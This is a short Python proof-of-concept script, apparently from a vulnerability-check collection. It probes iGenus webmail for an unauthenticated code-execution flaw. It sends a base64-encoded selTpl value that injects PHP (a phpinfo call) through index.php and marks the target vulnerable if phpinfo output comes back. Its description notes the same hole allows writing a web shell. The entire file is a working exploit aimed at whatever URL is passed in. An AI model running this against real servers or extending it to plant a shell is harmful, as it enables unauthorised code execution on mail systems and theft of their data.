#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: iGenus邮件系统一处无需登录的任意代码执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0156126
author: Lucifer
description: /home/webmail/igenus/include/login_inc.php base64编码未验证可写入shell
'''
import sys
import requests
import warnings
def run(url):
        result = ['iGenus邮件系统一处无需登录的任意代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?selTpl=YWF8YWFhJzsKcGhwaW5mbygpOyM="
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

